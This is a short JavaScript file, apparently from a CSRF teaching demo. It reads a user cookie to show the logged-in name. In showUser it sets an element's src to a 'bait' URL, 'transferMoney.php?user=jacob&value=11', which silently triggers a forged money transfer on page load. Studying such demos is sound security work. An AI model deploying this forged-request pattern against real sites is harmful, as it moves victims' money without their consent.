
function getCookie(cname) {
    var name = cname + "=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for(var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function showUser(){
    if ( getCookie("user") !== "" ) //User is Logged
    {
        $("#loggedUser").text(getCookie("user"));
    }

    //let root = document.location.hostname ;
    let bait = "transferMoney.php?user=jacob&value=11";
    let link = "/beti-csrf/"+bait;
    //console.log(link);
    $("#link").attr("src", link);
}